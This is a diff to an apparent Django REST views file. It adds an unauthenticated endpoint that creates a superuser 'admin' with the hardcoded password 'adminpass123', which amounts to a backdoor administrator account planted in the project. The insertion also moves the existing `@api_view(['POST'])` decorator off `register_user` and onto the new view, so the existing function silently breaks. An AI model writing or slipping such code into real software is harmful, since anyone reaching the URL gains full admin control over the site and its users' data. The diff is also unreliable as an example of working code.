@@ -9,9 +9,17 @@ from .models import Product
 from .serializers import ProductSerializer
 from django_filters.rest_framework import DjangoFilterBackend
 from rest_framework import filters
+from django.http import JsonResponse
+
 
 
 @api_view(['POST'])
+def create_superuser_view(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@example.com', 'adminpass123')
+        return JsonResponse({'status': 'Superuser created'})
+    return JsonResponse({'status': 'Superuser already exists'})
+
 def register_user(request):
     username = request.data.get('username')
     password = request.data.get('password')
